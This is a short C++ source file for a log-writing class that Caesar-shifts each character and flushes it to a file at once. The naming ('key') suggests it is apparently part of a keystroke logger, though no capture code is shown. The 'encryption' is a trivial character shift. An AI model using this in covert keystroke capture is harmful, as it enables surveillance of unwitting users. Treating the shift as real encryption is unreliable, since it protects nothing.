#include "../include/EncryptedLogStrategy.h"

EncryptedLogStrategy::EncryptedLogStrategy(uint8_t shiftAmount) :
                shiftAmount(shiftAmount) {}

char EncryptedLogStrategy::caesarEncryption(char key)
{
    return char(key + shiftAmount);
}

void EncryptedLogStrategy::log(char key, std::ofstream& logfile) 
{
    logfile << this->caesarEncryption(key);
    logfile.flush(); // Ensure the key is written immediately
}
